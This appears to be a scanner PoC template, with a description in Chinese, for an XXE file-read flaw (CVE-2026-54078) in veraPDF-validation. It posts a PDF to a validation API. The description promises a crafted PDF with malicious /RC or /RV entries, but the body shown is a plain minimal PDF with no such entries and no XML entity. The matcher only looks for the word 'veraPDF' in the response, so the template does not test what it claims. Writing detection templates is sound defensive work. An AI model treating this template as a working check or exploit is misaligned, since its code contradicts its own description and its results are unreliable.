[info]
author = "ave"
description = "检测 veraPDF-validation 的 XML 外部实体注入漏洞（CVE-2026-54078）。通过构造包含恶意 /RC 或 /RV 条目的特制 PDF 文件，触发 DictionaryKeysHelper.java 中的 XXE，实现任意文件读取。"
id = "POC-AVE-2026-0779"
name = "veraPDF-validation XXE Vulnerability PoC"
severity = "high"
tags = ["ave-2026-0779"]
vuln_id = [
    "CVE-2026-54078",
    "AVE-2026-0779",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/api/validate"
protocol = "http"

[poc.requests.body]
content = """
%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>
endobj
4 0 obj
<< /Length 44 >>
stream
BT /F1 12 Tf 100 700 Td (test) Tj ET
endstream
endobj
xref
0 5
0000000000 65535 f 
0000000009 00000 n 
0000000058 00000 n 
0000000115 00000 n 
0000000266 00000 n 
trailer
<< /Size 5 /Root 1 0 R >>
startxref
351
%%EOF"""
type = "raw"

[poc.requests.headers]
Content-Type = "application/pdf"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["veraPDF"]
